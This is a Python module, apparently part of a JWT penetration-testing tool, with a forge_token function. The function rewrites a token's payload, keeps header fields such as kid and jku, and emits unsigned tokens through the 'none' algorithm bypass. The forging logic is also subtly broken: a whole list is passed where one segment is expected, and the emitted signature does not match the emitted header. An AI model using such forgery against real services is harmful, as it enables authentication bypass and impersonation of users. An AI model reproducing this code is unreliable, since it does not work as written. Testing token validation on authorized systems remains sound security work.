"""Token forging - for authorized security testing only.

This module is dangerous. Don't be stupid with it.
"""

import jwt
import json
import logging
import base64
from typing import Optional
from core.parser import _base64url_decode

logger = logging.getLogger(__name__)

# These algs don't sign anything - server is vulnerable if it accepts them
NO_SIGNATURE_ALGORITHMS = {"none", "None", "NONE", "nOnE"}


def _b64url(data: bytes) -> str:
    """base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


def forge_token(token: str, new_payload: dict, secret: str,
                algorithm: str = "HS256") -> str:
    """Forge a JWT with a custom payload.

    We preserve the original header's non-standard fields (kid, jku, etc.)
    because some servers use those for key lookup.

    Args:
        token: original JWT (used to preserve header metadata)
        new_payload: dict that will become the new payload
        secret: signing secret
        algorithm: signing algorithm

    Returns:
        forged JWT string

    Raises:
        ValueError: if forging fails
    """
    if algorithm in NO_SIGNATURE_ALGORITHMS:
        logger.warning("Forging with 'none' algorithm - server is critically vulnerable!")

    try:
        # Peek at original header so we preserve kid/jku/etc
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Original token isn't a valid JWT")
        original_header = json.loads(_base64url_decode(parts))

        # Build new header - override alg/typ, keep everything else
        new_header = {"alg": algorithm, "typ": "JWT"}
        for k, v in original_header.items():
            if k not in ('alg', 'typ'):
                new_header[k] = v

        header_b64 = _b64url(json.dumps(new_header, separators=(',', ':')).encode())
        payload_b64 = _b64url(json.dumps(new_payload, separators=(',', ':')).encode())

        # 'none' alg = empty signature
        if algorithm in NO_SIGNATURE_ALGORITHMS:
            return f"{header_b64}.{payload_b64}."

        # Sign and stitch together (jwt.encode gives us header.payload.sig
        # but we want our own header for the custom fields)
        signed = jwt.encode(new_payload, secret, algorithm=algorithm)
        signature = signed.split('.')

        return f"{header_b64}.{payload_b64}.{signature}"

    except Exception as e:
        raise ValueError(f"Forgery failed: {e}")